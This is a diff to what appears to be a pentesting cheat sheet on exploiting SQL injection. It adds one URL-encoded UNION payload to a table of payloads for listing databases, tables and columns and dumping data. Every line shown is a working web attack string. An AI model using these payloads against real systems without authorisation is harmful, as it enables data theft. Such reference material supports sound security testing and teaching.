@@ -66,6 +66,7 @@ A repeatable process for finding and exploiting SQLi.
 | Get DB version | `' UNION SELECT @@version,NULL-- -` |
 | Get current DB | `' UNION SELECT database(),NULL-- -` |
 | List all DBs | `' UNION SELECT schema_name,NULL FROM INFORMATION_SCHEMA.SCHEMATA-- -` |
+| List tables in current DB | `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--` |
 | List tables | `' UNION SELECT TABLE_NAME,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='x'-- -` |
 | List columns | `' UNION SELECT COLUMN_NAME,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='x'-- -` |
 | Dump data | `' UNION SELECT col1,col2 FROM db.table-- -` |
